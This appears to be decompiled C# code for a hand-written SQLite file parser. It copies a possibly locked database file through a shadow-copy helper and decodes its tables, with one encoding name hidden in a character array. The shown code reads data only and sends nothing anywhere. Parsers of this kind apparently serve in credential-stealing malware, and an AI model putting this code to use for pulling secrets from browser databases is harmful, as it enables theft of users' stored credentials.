﻿using System;
using System.IO;
using System.Text;

// Token: 0x02000027 RID: 39
public class DataBaseConnection
{
	// Token: 0x17000005 RID: 5
	// (get) Token: 0x060000AA RID: 170 RVA: 0x00006B79 File Offset: 0x00004D79
	public int RowLength
	{
		get
		{
			return this.GetRowCount();
		}
	}

	// Token: 0x060000AB RID: 171 RVA: 0x00006B84 File Offset: 0x00004D84
	public DataBaseConnection(string fileName)
	{
		this._sqlDataTypeSize = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0,
			2,
			1,
			4,
			3,
			2,
			5,
			1,
			2
		};
		using (FileCopier fileCopier = new FileCopier())
		{
			this._fileBytes = File.ReadAllBytes(fileCopier.CreateShadowCopy(fileName));
		}
		this._pageSize = this.ConvertToULong(16, 2);
		this._dbEncoding = this.ConvertToULong(56, 4);
		this.ReadMasterTable(100L);
	}

	// Token: 0x060000AC RID: 172 RVA: 0x00006C0C File Offset: 0x00004E0C
	public string ParseValue(int rowIndex, string fieldName)
	{
		string result;
		try
		{
			int num = -1;
			int num2 = this.Fields.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				result = null;
			}
			else
			{
				result = this.ParseValue(rowIndex, num);
			}
		}
		catch
		{
			result = null;
		}
		return result;
	}

	// Token: 0x060000AD RID: 173 RVA: 0x00006C84 File Offset: 0x00004E84
	public string ParseValue(int rowNum, int field)
	{
		string result;
		try
		{
			if (rowNum >= this._tableEntries.Length)
			{
				result = null;
			}
			else
			{
				result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
			}
		}
		catch
		{
			result = "";
		}
		return result;
	}

	// Token: 0x060000AE RID: 174 RVA: 0x00006CEC File Offset: 0x00004EEC
	public int GetRowCount()
	{
		return this._tableEntries.Length;
	}

	// Token: 0x060000AF RID: 175 RVA: 0x00006CF8 File Offset: 0x00004EF8
	private bool ReadTableFromOffset(ulong offset)
	{
		bool result;
		try
		{
			if (this._fileBytes[(int)(checked((IntPtr)offset))] == 13)
			{
				uint num = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
				int num2 = 0;
				if (this._tableEntries != null)
				{
					num2 = this._tableEntries.Length;
					Array.Resize<TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
				}
				else
				{
					this._tableEntries = new TableEntry[num + 1U];
				}
				for (uint num3 = 0U; num3 <= num; num3 += 1U)
				{
					ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
					if (offset != 100UL)
					{
						num4 += offset;
					}
					int num5 = this.Gvl((int)num4);
					this.Cvl((int)num4, num5);
					int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
					this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
					ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
					int num8 = this.Gvl((int)num7);
					int num9 = num8;
					long num10 = this.Cvl((int)num7, num8);
					RecordHeaderField[] array = null;
					long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
					int num12 = 0;
					while (num11 < num10)
					{
						Array.Resize<RecordHeaderField>(ref array, num12 + 1);
						int num13 = num9 + 1;
						num9 = this.Gvl(num13);
						array[num12].Type = this.Cvl(num13, num9);
						array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!DataBaseConnection.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
						num11 = num11 + (long)(num9 - num13) + 1L;
						num12++;
					}
					if (array != null)
					{
						this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
						int num14 = 0;
						for (int i = 0; i <= array.Length - 1; i++)
						{
							if (array[i].Type > 9L)
							{
								if (!DataBaseConnection.IsOdd(array[i].Type))
								{
									if (this._dbEncoding == 1UL)
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Encoding.GetEncoding(new string(new char[]
										{
											'w',
											'i',
											'n',
											'd',
											'o',
											'w',
											's',
											'-',
											'1',
											'2',
											'5',
											'1'
										})).GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									}
									else if (this._dbEncoding == 2UL)
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									}
									else if (this._dbEncoding == 3UL)
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									}
								}
								else
								{
									this._tableEntries[num2 + (int)num3].Content[i] = Encoding.GetEncoding(new string(new char[]
									{
										'w',
										'i',
										'n',
										'd',
										'o',
										'w',
										's',
										'-',
										'1',
										'2',
										'5',
										'1'
									})).GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
								}
							}
							else
							{
								this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size));
							}
							num14 += (int)array[i].Size;
						}
					}
				}
			}
			else if (this._fileBytes[(int)(checked((IntPtr)offset))] == 5)
			{
				uint num15 = (uint)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
				for (uint num16 = 0U; num16 <= num15; num16 += 1U)
				{
					uint num17 = (uint)this.ConvertToULong((int)offset + 12 + (int)(num16 * 2U), 2);
					this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num17), 4) - 1UL) * this._pageSize);
				}
				this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
			}
			result = true;
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x060000B0 RID: 176 RVA: 0x00007194 File Offset: 0x00005394
	private void ReadMasterTable(long offset)
	{
		try
		{
			byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
			if (b != 5)
			{
				if (b == 13)
				{
					ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
					int num2 = 0;
					if (this._masterTableEntries != null)
					{
						num2 = this._masterTableEntries.Length;
						Array.Resize<SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
					}
					else
					{
						this._masterTableEntries = new SqliteMasterEntry[num + 1UL];
					}
					for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
					{
						ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
						if (offset != 100L)
						{
							num4 += (ulong)offset;
						}
						int num5 = this.Gvl((int)num4);
						this.Cvl((int)num4, num5);
						int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
						this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
						ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
						int num8 = this.Gvl((int)num7);
						int num9 = num8;
						long num10 = this.Cvl((int)num7, num8);
						long[] array = new long[5];
						for (int i = 0; i <= 4; i++)
						{
							int startIdx = num9 + 1;
							num9 = this.Gvl(startIdx);
							array[i] = this.Cvl(startIdx, num9);
							array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!DataBaseConnection.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
						}
						if (this._dbEncoding == 1UL || this._dbEncoding == 2UL)
						{
							if (this._dbEncoding == 1UL)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.GetEncoding(new string(new char[]
								{
									'w',
									'i',
									'n',
									'd',
									'o',
									'w',
									's',
									'-',
									'1',
									'2',
									'5',
									'1'
								})).GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
							}
							else if (this._dbEncoding == 2UL)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
							}
							else if (this._dbEncoding == 3UL)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
							}
						}
						this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
						if (this._dbEncoding == 1UL)
						{
							this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.GetEncoding(new string(new char[]
							{
								'w',
								'i',
								'n',
								'd',
								'o',
								'w',
								's',
								'-',
								'1',
								'2',
								'5',
								'1'
							})).GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
						}
						else if (this._dbEncoding == 2UL)
						{
							this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
						}
						else if (this._dbEncoding == 3UL)
						{
							this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
						}
					}
				}
			}
			else
			{
				uint num11 = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
				for (int j = 0; j <= (int)num11; j++)
				{
					uint num12 = (uint)this.ConvertToULong((int)offset + 12 + j * 2, 2);
					if (offset == 100L)
					{
						this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
					}
					else
					{
						this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
					}
				}
				this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
			}
		}
		catch
		{
		}
	}

	// Token: 0x060000B1 RID: 177 RVA: 0x0000760C File Offset: 0x0000580C
	public bool ReadTable(string tableName)
	{
		bool result;
		try
		{
			int num = -1;
			for (int i = 0; i <= this._masterTableEntries.Length; i++)
			{
				if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				result = false;
			}
			else
			{
				string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
				{
					','
				});
				for (int j = 0; j <= array.Length - 1; j++)
				{
					array[j] = array[j].TrimStart(new char[0]);
					int num2 = array[j].IndexOf(' ');
					if (num2 > 0)
					{
						array[j] = array[j].Substring(0, num2);
					}
					if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
					{
						Array.Resize<string>(ref this.Fields, j + 1);
						this.Fields[j] = array[j];
					}
				}
				result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
			}
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x060000B2 RID: 178 RVA: 0x00007764 File Offset: 0x00005964
	private ulong ConvertToULong(int startIndex, int size)
	{
		ulong result;
		try
		{
			if (size > 8 | size == 0)
			{
				result = 0UL;
			}
			else
			{
				ulong num = 0UL;
				for (int i = 0; i <= size - 1; i++)
				{
					num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
				}
				result = num;
			}
		}
		catch
		{
			result = 0UL;
		}
		return result;
	}

	// Token: 0x060000B3 RID: 179 RVA: 0x000077C0 File Offset: 0x000059C0
	private int Gvl(int startIdx)
	{
		int result;
		try
		{
			if (startIdx > this._fileBytes.Length)
			{
				result = 0;
			}
			else
			{
				for (int i = startIdx; i <= startIdx + 8; i++)
				{
					if (i > this._fileBytes.Length - 1)
					{
						return 0;
					}
					if ((this._fileBytes[i] & 128) != 128)
					{
						return i;
					}
				}
				result = startIdx + 8;
			}
		}
		catch
		{
			result = 0;
		}
		return result;
	}

	// Token: 0x060000B4 RID: 180 RVA: 0x00007830 File Offset: 0x00005A30
	private long Cvl(int startIdx, int endIdx)
	{
		long result;
		try
		{
			endIdx++;
			byte[] array = new byte[8];
			int num = endIdx - startIdx;
			bool flag = false;
			if (num == 0 | num > 9)
			{
				result = 0L;
			}
			else if (num == 1)
			{
				array[0] = (this._fileBytes[startIdx] & 127);
				result = BitConverter.ToInt64(array, 0);
			}
			else
			{
				if (num == 9)
				{
					flag = true;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = this._fileBytes[endIdx - 1];
					endIdx--;
					num4 = 1;
				}
				for (int i = endIdx - 1; i >= startIdx; i += -1)
				{
					if (i - 1 >= startIdx)
					{
						array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
					}
				}
				result = BitConverter.ToInt64(array, 0);
			}
		}
		catch
		{
			result = 0L;
		}
		return result;
	}

	// Token: 0x060000B5 RID: 181 RVA: 0x00007950 File Offset: 0x00005B50
	private static bool IsOdd(long value)
	{
		return (value & 1L) == 1L;
	}

	// Token: 0x0400001C RID: 28
	private readonly byte[] _sqlDataTypeSize;

	// Token: 0x0400001D RID: 29
	private readonly ulong _dbEncoding;

	// Token: 0x0400001E RID: 30
	private readonly byte[] _fileBytes;

	// Token: 0x0400001F RID: 31
	private readonly ulong _pageSize;

	// Token: 0x04000020 RID: 32
	public string[] Fields;

	// Token: 0x04000021 RID: 33
	private SqliteMasterEntry[] _masterTableEntries;

	// Token: 0x04000022 RID: 34
	private TableEntry[] _tableEntries;
}
